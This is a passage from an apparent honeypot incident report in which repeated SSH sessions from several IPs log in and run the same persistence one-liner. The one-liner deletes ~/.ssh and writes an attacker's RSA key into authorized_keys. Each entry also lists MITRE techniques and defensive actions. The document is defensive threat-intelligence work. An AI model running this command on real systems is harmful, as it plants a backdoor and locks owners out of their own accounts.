| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:29:22` | `cowrie.session.connect` |
| `2026-06-02 09:29:22` | `cowrie.client.version` |
| `2026-06-02 09:29:22` | `cowrie.client.kex` |
| `2026-06-02 09:29:22` | `cowrie.login.success` |
| `2026-06-02 09:29:22` | `cowrie.session.params` |
| `2026-06-02 09:29:22` | `cowrie.command.input` |
| `2026-06-02 09:29:22` | `cowrie.command.failed` |
| `2026-06-02 09:29:23` | `cowrie.log.closed` |
| `2026-06-02 09:29:23` | `cowrie.session.params` |
| `2026-06-02 09:29:23` | `cowrie.command.input` |
| `2026-06-02 09:29:23` | `cowrie.session.file_download` |
| `2026-06-02 09:29:23` | `cowrie.log.closed` |
| `2026-06-02 09:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f6718080c7b

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:29 |
| **Last Seen** | 2026-06-02 09:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:29:25` | `cowrie.session.connect` |
| `2026-06-02 09:29:25` | `cowrie.client.version` |
| `2026-06-02 09:29:25` | `cowrie.client.kex` |
| `2026-06-02 09:29:25` | `cowrie.login.success` |
| `2026-06-02 09:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfa09f801ae4

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:32 |
| **Last Seen** | 2026-06-02 09:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:32:32` | `cowrie.session.connect` |
| `2026-06-02 09:32:32` | `cowrie.client.version` |
| `2026-06-02 09:32:32` | `cowrie.client.kex` |
| `2026-06-02 09:32:32` | `cowrie.login.success` |
| `2026-06-02 09:32:33` | `cowrie.session.params` |
| `2026-06-02 09:32:33` | `cowrie.command.input` |
| `2026-06-02 09:32:33` | `cowrie.command.failed` |
| `2026-06-02 09:32:33` | `cowrie.log.closed` |
| `2026-06-02 09:32:33` | `cowrie.session.params` |
| `2026-06-02 09:32:33` | `cowrie.command.input` |
| `2026-06-02 09:32:33` | `cowrie.session.file_download` |
| `2026-06-02 09:32:33` | `cowrie.log.closed` |
| `2026-06-02 09:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9e677a63a6

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:32 |
| **Last Seen** | 2026-06-02 09:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:32:35` | `cowrie.session.connect` |
| `2026-06-02 09:32:35` | `cowrie.client.version` |
| `2026-06-02 09:32:35` | `cowrie.client.kex` |
| `2026-06-02 09:32:35` | `cowrie.login.success` |
| `2026-06-02 09:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc147d42c548

| Field | Detail |
|---|---|
| **Source IP** | `181.115.208[.]189` |
| **First Seen** | 2026-06-02 09:38 |
| **Last Seen** | 2026-06-02 09:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:38:23` | `cowrie.session.connect` |
| `2026-06-02 09:38:23` | `cowrie.client.version` |
| `2026-06-02 09:38:24` | `cowrie.client.kex` |
| `2026-06-02 09:38:25` | `cowrie.login.success` |
| `2026-06-02 09:38:26` | `cowrie.session.params` |
| `2026-06-02 09:38:26` | `cowrie.command.input` |
| `2026-06-02 09:38:26` | `cowrie.command.failed` |
| `2026-06-02 09:38:26` | `cowrie.log.closed` |
| `2026-06-02 09:38:27` | `cowrie.session.params` |
| `2026-06-02 09:38:27` | `cowrie.command.input` |
| `2026-06-02 09:38:27` | `cowrie.session.file_download` |
| `2026-06-02 09:38:27` | `cowrie.log.closed` |
| `2026-06-02 09:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.115.208[.]189` to AbuseIPDB if not already reported
- [ ] Block `181.115.208[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e2cf47a8dfa

| Field | Detail |
|---|---|
| **Source IP** | `181.115.208[.]189` |
| **First Seen** | 2026-06-02 09:38 |
| **Last Seen** | 2026-06-02 09:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:38:31` | `cowrie.session.connect` |
| `2026-06-02 09:38:31` | `cowrie.client.version` |
| `2026-06-02 09:38:31` | `cowrie.client.kex` |
| `2026-06-02 09:38:33` | `cowrie.login.success` |
| `2026-06-02 09:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.115.208[.]189` to AbuseIPDB if not already reported
- [ ] Block `181.115.208[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d96dc0c2f05c

| Field | Detail |
|---|---|
| **Source IP** | `187.210.77[.]100` |
| **First Seen** | 2026-06-02 09:43 |
| **Last Seen** | 2026-06-02 09:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:43:41` | `cowrie.session.connect` |
| `2026-06-02 09:43:41` | `cowrie.client.version` |
| `2026-06-02 09:43:42` | `cowrie.client.kex` |
| `2026-06-02 09:43:43` | `cowrie.login.success` |
| `2026-06-02 09:43:44` | `cowrie.session.params` |
| `2026-06-02 09:43:44` | `cowrie.command.input` |
| `2026-06-02 09:43:44` | `cowrie.command.failed` |
| `2026-06-02 09:43:45` | `cowrie.log.closed` |
| `2026-06-02 09:43:45` | `cowrie.session.params` |
| `2026-06-02 09:43:45` | `cowrie.command.input` |
| `2026-06-02 09:43:46` | `cowrie.session.file_download` |
| `2026-06-02 09:43:46` | `cowrie.log.closed` |
| `2026-06-02 09:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.210.77[.]100` to AbuseIPDB if not already reported
- [ ] Block `187.210.77[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af3e05f5ad06

| Field | Detail |
|---|---|
| **Source IP** | `187.210.77[.]100` |
| **First Seen** | 2026-06-02 09:43 |
| **Last Seen** | 2026-06-02 09:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:43:50` | `cowrie.session.connect` |
| `2026-06-02 09:43:50` | `cowrie.client.version` |
| `2026-06-02 09:43:50` | `cowrie.client.kex` |
| `2026-06-02 09:43:52` | `cowrie.login.success` |
| `2026-06-02 09:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.210.77[.]100` to AbuseIPDB if not already reported
- [ ] Block `187.210.77[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37bef1d55b1c

| Field | Detail |
|---|---|
| **Source IP** | `38.22.170[.]10` |
| **First Seen** | 2026-06-02 09:44 |
| **Last Seen** | 2026-06-02 09:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:44:59` | `cowrie.session.connect` |
| `2026-06-02 09:44:59` | `cowrie.client.version` |
| `2026-06-02 09:44:59` | `cowrie.client.kex` |
| `2026-06-02 09:45:01` | `cowrie.login.success` |
| `2026-06-02 09:45:01` | `cowrie.session.params` |
| `2026-06-02 09:45:01` | `cowrie.command.input` |
| `2026-06-02 09:45:01` | `cowrie.command.failed` |
| `2026-06-02 09:45:02` | `cowrie.log.closed` |
| `2026-06-02 09:45:02` | `cowrie.session.params` |
| `2026-06-02 09:45:02` | `cowrie.command.input` |
| `2026-06-02 09:45:02` | `cowrie.session.file_download` |
| `2026-06-02 09:45:02` | `cowrie.log.closed` |
| `2026-06-02 09:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.22.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `38.22.170[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2d0ab748563

| Field | Detail |
|---|---|
| **Source IP** | `38.22.170[.]10` |
| **First Seen** | 2026-06-02 09:45 |
| **Last Seen** | 2026-06-02 09:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:45:05` | `cowrie.session.connect` |
| `2026-06-02 09:45:05` | `cowrie.client.version` |
| `2026-06-02 09:45:06` | `cowrie.client.kex` |
| `2026-06-02 09:45:07` | `cowrie.login.success` |
| `2026-06-02 09:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.22.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `38.22.170[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdf9f80b1c5c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:49 |
| **Last Seen** | 2026-06-02 09:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:49:11` | `cowrie.session.connect` |
| `2026-06-02 09:49:11` | `cowrie.client.version` |
| `2026-06-02 09:49:11` | `cowrie.client.kex` |
| `2026-06-02 09:49:12` | `cowrie.login.success` |
| `2026-06-02 09:49:12` | `cowrie.session.params` |
| `2026-06-02 09:49:12` | `cowrie.command.input` |
| `2026-06-02 09:49:12` | `cowrie.command.failed` |
| `2026-06-02 09:49:12` | `cowrie.log.closed` |
| `2026-06-02 09:49:13` | `cowrie.session.params` |
| `2026-06-02 09:49:13` | `cowrie.command.input` |
| `2026-06-02 09:49:13` | `cowrie.session.file_download` |
| `2026-06-02 09:49:13` | `cowrie.log.closed` |
| `2026-06-02 09:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2765f0c3a196

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:49 |
| **Last Seen** | 2026-06-02 09:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:49:14` | `cowrie.session.connect` |
| `2026-06-02 09:49:14` | `cowrie.client.version` |
| `2026-06-02 09:49:15` | `cowrie.client.kex` |
| `2026-06-02 09:49:15` | `cowrie.login.success` |
| `2026-06-02 09:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cc3fa4ea02e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:52 |
| **Last Seen** | 2026-06-02 09:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:52:14` | `cowrie.session.connect` |
| `2026-06-02 09:52:14` | `cowrie.client.version` |
| `2026-06-02 09:52:14` | `cowrie.client.kex` |
| `2026-06-02 09:52:15` | `cowrie.login.success` |
| `2026-06-02 09:52:15` | `cowrie.session.params` |
| `2026-06-02 09:52:15` | `cowrie.command.input` |
| `2026-06-02 09:52:15` | `cowrie.command.failed` |
| `2026-06-02 09:52:15` | `cowrie.log.closed` |
| `2026-06-02 09:52:15` | `cowrie.session.params` |
| `2026-06-02 09:52:15` | `cowrie.command.input` |
| `2026-06-02 09:52:15` | `cowrie.session.file_download` |
| `2026-06-02 09:52:15` | `cowrie.log.closed` |
| `2026-06-02 09:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27daaf561e88

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:52 |
| **Last Seen** | 2026-06-02 09:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:52:17` | `cowrie.session.connect` |
| `2026-06-02 09:52:17` | `cowrie.client.version` |
| `2026-06-02 09:52:17` | `cowrie.client.kex` |
| `2026-06-02 09:52:18` | `cowrie.login.success` |
| `2026-06-02 09:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d21776caed5

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 09:53 |
| **Last Seen** | 2026-06-02 09:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:53:09` | `cowrie.session.connect` |
| `2026-06-02 09:53:09` | `cowrie.client.version` |
| `2026-06-02 09:53:09` | `cowrie.client.kex` |
| `2026-06-02 09:53:10` | `cowrie.login.success` |
| `2026-06-02 09:53:11` | `cowrie.session.params` |
| `2026-06-02 09:53:11` | `cowrie.command.input` |
| `2026-06-02 09:53:11` | `cowrie.command.failed` |
| `2026-06-02 09:53:11` | `cowrie.log.closed` |
| `2026-06-02 09:53:11` | `cowrie.session.params` |
| `2026-06-02 09:53:11` | `cowrie.command.input` |
| `2026-06-02 09:53:12` | `cowrie.session.file_download` |
| `2026-06-02 09:53:12` | `cowrie.log.closed` |
| `2026-06-02 09:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05311888c3c0

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 09:53 |
| **Last Seen** | 2026-06-02 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:53:14` | `cowrie.session.connect` |
| `2026-06-02 09:53:14` | `cowrie.client.version` |
| `2026-06-02 09:53:15` | `cowrie.client.kex` |
| `2026-06-02 09:53:15` | `cowrie.login.success` |
| `2026-06-02 09:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03caa87d7013

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 09:54 |
| **Last Seen** | 2026-06-02 09:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:54:38` | `cowrie.session.connect` |
| `2026-06-02 09:54:38` | `cowrie.client.version` |
| `2026-06-02 09:54:38` | `cowrie.client.kex` |
| `2026-06-02 09:54:39` | `cowrie.login.success` |
| `2026-06-02 09:54:39` | `cowrie.session.params` |
| `2026-06-02 09:54:39` | `cowrie.command.input` |
